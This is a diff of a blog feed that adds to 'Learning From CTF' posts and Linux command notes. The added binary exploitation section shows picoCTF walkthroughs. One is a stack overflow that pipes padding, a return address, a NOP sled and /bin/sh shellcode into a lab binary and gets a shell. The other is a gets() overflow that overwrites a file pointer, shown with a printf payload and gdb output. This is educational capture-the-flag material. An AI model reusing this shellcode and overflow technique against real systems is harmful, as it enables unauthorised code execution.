+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">no_overflow</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">268</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\xd0\xd6\xff\xff</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">200</span><span class="o">+</span><span class="s">&quot; &quot;</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc9</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">x51</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span><span class="s">&quot;&#39;; cat) | ./no_overflow</span>
+</span><span class='line'><span class="n">How</span> <span class="kt">long</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
+</span><span class='line'><span class="n">What</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
+</span><span class='line'><span class="n">Hello</span><span class="p">,</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAA</span><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">id</span>
+</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">no_overflow</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
+</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+</span><span class='line'><span class="n">what_is_your_sign</span>
+</span></code></pre></td></tr></table></div></figure>
+</li>
+
+<li>
+In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string &#8220;not_the_flag.txt&#8221; as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) br *puts
+</span><span class='line'>Breakpoint 1 at 0x8048460
+</span><span class='line'>(gdb) run
+</span><span class='line'>Starting program: /home/what_the_flag/what_the_flag 
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
+</span><span class='line'>(gdb) x/s 0x08048777
+</span><span class='line'>0x8048777:    "not_the_flag.txt"
+</span><span class='line'>(gdb) x/s 0x08048778
+</span><span class='line'>0x8048778:    "ot_the_flag.txt"
+</span><span class='line'>(gdb) x/s 0x08048770
+</span><span class='line'>0x8048770:    "le: %s"
+</span><span class='line'>(gdb) x/s 0x0804877C
+</span><span class='line'>0x804877c:    "he_flag.txt"
+</span><span class='line'>(gdb) x/s 0x0804877D
+</span><span class='line'>0x804877d:    "e_flag.txt"
+</span><span class='line'>(gdb) x/s 0x0804877E
+</span><span class='line'>0x804877e:    "_flag.txt"
+</span><span class='line'>(gdb) x/s 0x0804877F
+</span><span class='line'>0x804877f:    "flag.txt"
+</span></code></pre></td></tr></table></div></figure>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">message_data</span><span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">file_name</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">file</span><span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)){</span>
+</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;Cannot read file: %s&quot;</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">message_data</span> <span class="n">data</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">data</span><span class="p">.</span><span class="n">file_name</span> <span class="o">=</span> <span class="s">&quot;not_the_flag.txt&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your password too see the message:&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">gets</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;1337_P455W0RD&quot;</span><span class="p">)){</span>
+</span><span class='line'>        <span class="n">read_file</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Incorrect password!&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual:
+
+gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below).
+
+So by using the following input, we can overwrite the file pointer and still provide the correct password:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1337_P455W0RD
+</span><span class='line'>1337_P455W0RD\0aa\x7f\x87\x04\x08
+</span><span class='line'>aa\x7f\x87\x04\x08</span></code></pre></td></tr></table></div></figure>
+We use this in the command line to get the flag
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
+</span><span class='line'>Enter your password too see the message:
+</span><span class='line'>Congratulations! Here is the flag: who_needs_%eip
+</span><span class='line'>
+</span><span class='line'>pico83515@shell:/home/what_the_flag$</span></code></pre></td></tr></table></div></figure>
+</li>
 </ol>
 
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Learning From CTF: Forensics]]></title>
+    <title type="html"><![CDATA[Learning From CTF : Forensics]]></title>
     <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics/"/>
     <updated>2014-11-07T22:07:09+00:00</updated>
     <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics</id>
@@ -414,7 +964,24 @@ apktool converts the apk file in to smali format. smali/baksmali is an assembler
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>ls -lb might be of help.
 </span><span class='line'>-b, --escape :   print C-style escapes for nongraphic characters
-</span></code></pre></td></tr></table></div></figure> </li>
+</span></code></pre></td></tr></table></div></figure> 
+
+How to open a filename named &#8220;-&#8221;
+
+We can create a file named &#8220;-&#8221; by 
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo hello &gt; -</span></code></pre></td></tr></table></div></figure>
+and this file can be opened by
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat ./-</span></code></pre></td></tr></table></div></figure>
+This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
+</li>
+
+<li>If you have a hex dump of something and you want to create the binary version of the data?
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>xxd -r &lt;data&gt;
+</span><span class='line'>&lt;data&gt; is the hexdump of the binary file.</span></code></pre></td></tr></table></div></figure> </li>
 
 
 </ol>
@@ -425,7 +992,7 @@ apktool converts the apk file in to smali format. smali/baksmali is an assembler
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Learning From CTF: Cryptography]]></title>
+    <title type="html"><![CDATA[Learning From CTF : Cryptography]]></title>
     <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography/"/>
     <updated>2014-11-07T19:25:31+00:00</updated>
     <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography</id>
@@ -849,6 +1416,12 @@ If ftp anonymous login is provided or you have login details, you can download t
 
 </ol>
 </li>
+
+<li>Tips:
+<ul>
+<li>Wheel group typically has special(higer) privileges such as ability to become root, or the ability to bypass certain security restrictions.</li>
+</ul>
+</li>
 </ol>
 
 ]]></content>
@@ -1018,11 +1591,17 @@ poweroff would shutdown the system after everything is updated.
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>chown              : Change file owner and group.
 </span><span class='line'>-reference=RFILE   : use RFILE's owner and group rather than specifying OWNER:GROUP values.
 </span><span class='line'>-R, --recursive    : operate on files and directories recursively.
 </span><span class='line'>chmod              : change file mode bits.
-</span><span class='line'>chgrp              : change group ownership.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>chgrp              : change group ownership.
+</span><span class='line'>SUID bit           : SetUID bit specfies that an executable should run as its owner instead of the user executing it.
+</span><span class='line'>                   : SUID is mostly commonly used to run an executable as root, allowing users to perform tasks such as changing their passwords.
+</span><span class='line'>         : If there is a flaw in a SUID root executable, you can run arbitrary code as root.</span></code></pre></td></tr></table></div></figure>
 </li>
 
 <li>Mounting/Unmounting
@@ -1059,6 +1638,13 @@ poweroff would shutdown the system after everything is updated.
 <li>Runlevels and Kernel Configurations
 
 <ul type="i">
+<li>Linux Boot Process:
+<ol>
+<li>BIOS starts the boot loader.</li>
+<li>Boot loader loads the kernel into memory.</li>
+<li>The Kernel mounts disks/partitions and starts the init daemon.</li>
+<li>The init daemon starts services based on the runlevel.</li>
+</ol></li>
 <li>Linux has six runlevels 0-6. Scripts are contained in /etc/rc[0-6,S].d/. Each folder contains the scripts which are followed by either K or S. If the first letter is K that script is not executed. If S, that script is executed. /etc/inittab contains the default run level.
 <style type="text/css">
 .tg  {border-collapse:collapse;border-spacing:0;border-color:#ccc;}
@@ -1248,6 +1834,16 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 </span><span class='line'>-z        : gzip format</span></code></pre></td></tr></table></div></figure>
 </li>
 
+<li>find - Searching files
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-user       : File is owned by user uname (numeric user ID allowed).
+</span><span class='line'>-group      : File belongs to group gname (numeric group ID allowed).
+</span><span class='line'>-size       : File uses n units of space. c/k/M/G: bytes/Kilobytes/Megabytes/Gigabytes.
+</span><span class='line'>-name       :</span></code></pre></td></tr></table></div></figure>
+</li>
 
 <li>Some other
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -1272,6 +1868,9 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 <span class='line-number'>20</span>
 <span class='line-number'>21</span>
 <span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>nm-applet : a applet for network manager.
 </span><span class='line'>wc        : print newline, word, and byte counts for each file.
 </span><span class='line'>   -c     : print the bytes count.
@@ -1293,13 +1892,32 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 </span><span class='line'>   -d     : delete characters in the text.
 </span><span class='line'>tee       : saves output in file as well as forward it.
 </span><span class='line'>touch     : Create zero byte files, mainly used for changing the timestamps of the file.
-</span><span class='line'>make      : If your program source file name is test.c/cpp, then you can directly write make test, this would compile the test.c/cpp program. Remember this it's a faster way.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>make      : If your program source file name is test.c/cpp, then you can directly write make test, this would compile the test.c/cpp program. Remember this it's a faster way.
+</span><span class='line'>stat      : View detailed information about a file, including its name,size, last modified date, and permissons.
+</span><span class='line'>uniq      : Report or omit repeated lines.
+</span><span class='line'>   -c     : prefix lines by the number of occurrences. (--count)</span></code></pre></td></tr></table></div></figure>
 </li>
 </ul>
 </li>
+
+<li>Special Characters:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>*(asterik)          : A wildcard used to represent zero or more characters in a filename. For example: ls *.txt will list all the names ending in ".txt" such as "file1.txt" and "file23.txt".
+</span><span class='line'>?(question mark)    : A wildcard used to represent a single character in a filename. For example ls pic?.jpg would match "pic1.jpg" and "pic2.jpg" but not "pic24.jpg" or "pic.jpg".
+</span><span class='line'>[](square brackets) : These are used to specify a range of values to match. For example, "[0-9]" and "[a-z]".
+</span><span class='line'>;(semi colon)       : Command separator that can be used to run multiple commands on a single line unconditionally.
+</span><span class='line'>&&(double ampersand): Command separator which will only run the second command if the first one is successful (does not return an error.)
+</span><span class='line'>||(double pipe)     : Command separator which will only run the second command if the first command failed (had errors). Commonly used to terminate the script if an important command fails.</span></code></pre></td></tr></table></div></figure></li>
 <li>Few Important Differences in Commands:
 <ol type="i">
-<li> su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp; Change users or become superuser. The difference between su - <username> and su <username> is that former su - would switch to the new user directory. It would also change the environment variable according to the changed user.</li>
+<li> su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp; Change users or become superuser. The difference between su - <username> and su <username> is that former su - would switch to the new user directory. It would also change the environment variable according to the changed user.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>su -c "command" : Specify a command that will be invoked by the shell using its -c.</span></code></pre></td></tr></table></div></figure></li>
 <li>sudo&nbsp;&nbsp; :&nbsp; execute a command as another user. The difference between su and sudo is &#8216;su&#8217; forces you to share your root password to other users whereas &#8216;sudo&#8217; makes it possible to execute system commands without root password. &#8216;sudo&#8217; lets you use your own password to execute system commands i.e. delegates system responsibility without root password.</li>
 </ol></li>
 <br>
@@ -1319,6 +1937,7 @@ Find a way to scan my entire linux system for all files containing a specific st
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
 <span class='line-number'>12</span>
+<span class='line-number'>13</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>grep -rnw 'directory' -e "pattern" --include={*.c,*.h} --exclude=*.o
 </span><span class='line'>-r                    : search recursively
 </span><span class='line'>-n                    : print line number
@@ -1330,7 +1949,8 @@ Find a way to scan my entire linux system for all files containing a specific st
 </span><span class='line'>-i, --ignore-case     : 'it DoesNt MatTTer WhaT thE CAse Is'
 </span><span class='line'>-v, --invert-match    : 'everything , BUT that text'
 </span><span class='line'>-A &lt;NUM>              : Print NUM lines of trailing context after matching lines.
-</span><span class='line'>-B &lt;NUM>              : Print NUM lines of trailing context before matching lines.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>-B &lt;NUM>              : Print NUM lines of trailing context before matching lines.
+</span><span class='line'>-a, --text            : Process a binary file as if it were text; this is equivalent to the --binary-files=text option.</span></code></pre></td></tr></table></div></figure>
 </li>
 <li>We often do mistakes while updating using apt-get which just leaves us with command line access to the system (GUI messed up). Possibly we unintentionally removed some neccessary packages.
 <br>
@@ -1436,6 +2056,17 @@ Checks equality between numbers:
 </span><span class='line'>-z x            : Evaluates to true if x is null.</span></code></pre></td></tr></table></div></figure></li>
 </ul>
 </li>
+
+<li>Some Important Definitions:
+<br>
+We want our information to:
+<ul>
+<li>be read by only the right people (confidentiality)</li>
+<li>only be changed by authorised people or processes (integrity)</li>
+<li>be available to read and use whenever we want (availability).</li>
+</ul>
+<br>
+Non-repudiation is about ensuring that users cannot deny knowledge of sending a message or performing some online activity at some later point in time. For example, in an online banking system the user cannot be allowed to claim that they didn’t send a payment to a recipient after the bank has transferred the funds to the recipient’s account.</li>
 
 </ol>
 
